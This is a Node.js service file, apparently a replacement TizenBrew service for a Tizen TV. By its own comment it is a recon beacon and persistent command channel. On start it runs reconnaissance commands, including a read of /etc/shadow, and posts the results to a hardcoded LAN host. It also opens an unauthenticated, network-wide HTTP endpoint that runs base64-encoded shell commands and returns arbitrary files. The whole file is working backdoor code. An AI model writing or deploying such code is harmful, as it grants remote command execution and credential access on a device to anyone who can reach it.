"use strict";
// Replacement TizenBrew StandaloneService: recon beacon + persistent command channel.
var http = require('http');
var cp = require('child_process');
var fs = require('fs');
var MAC = '192.168.0.188';

function beacon(tag, data) {
  try {
    var body = String(data);
    var req = http.request({ host: MAC, port: 9090, path: '/' + tag, method: 'POST',
      headers: { 'Content-Length': Buffer.byteLength(body) } }, function () {});
    req.on('error', function () {});
    req.end(body);
  } catch (e) {}
}

function run(cmd, cb) {
  try { cp.exec(cmd, { timeout: 25000 }, function (err, stdout, stderr) { cb((err ? ('[ERR] ' + err + '\n') : '') + stdout + stderr); }); }
  catch (e) { cb('[EXC] ' + e); }
}

var RECON1 = 'id; uname -a; cat /proc/version; echo ===MOUNTS===; cat /proc/mounts; echo ===SELF===; grep -E "Uid|Gid|Cap|Seccomp" /proc/self/status';
var RECON2 = 'echo ===ROOT===; ls -la /; echo ===APPS===; ls /opt/usr/apps | head -40; echo ===BIN===; ls /usr/bin | head -60; echo ===SHADOW===; head -c 300 /etc/shadow 2>&1';

module.exports.onStart = function () {
  beacon('boot', 'node=' + process.version + ' uid=' + (typeof process.getuid === 'function' ? process.getuid() : '?') +
         ' gid=' + (typeof process.getgid === 'function' ? process.getgid() : '?') + ' cwd=' + process.cwd());
  run(RECON1, function (o) { beacon('recon1', o); });
  run(RECON2, function (o) { beacon('recon2', o); });

  var srv = http.createServer(function (req, res) {
    res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
    var url = require('url').parse(req.url, true);
    if (url.pathname === '/x' && url.query.c) {
      var cmd = (typeof Buffer.from === 'function' ? Buffer.from(url.query.c, 'base64') : new Buffer(url.query.c, 'base64')).toString('utf8');
      run(cmd, function (o) { res.end(o); beacon('cmd', cmd + '\n---\n' + o); });
    } else if (url.pathname === '/f' && url.query.p) {
      try { res.end(fs.readFileSync(url.query.p).toString('utf8')); }
      catch (e) { res.end('[ERR] ' + e); }
    } else {
      res.end('tvroot service alive\n');
    }
  });
  srv.listen(9191, '0.0.0.0', function () { beacon('listen', 'cmd channel on 9191'); });
  srv.on('error', function (e) { beacon('listen-fail', String(e)); });
};
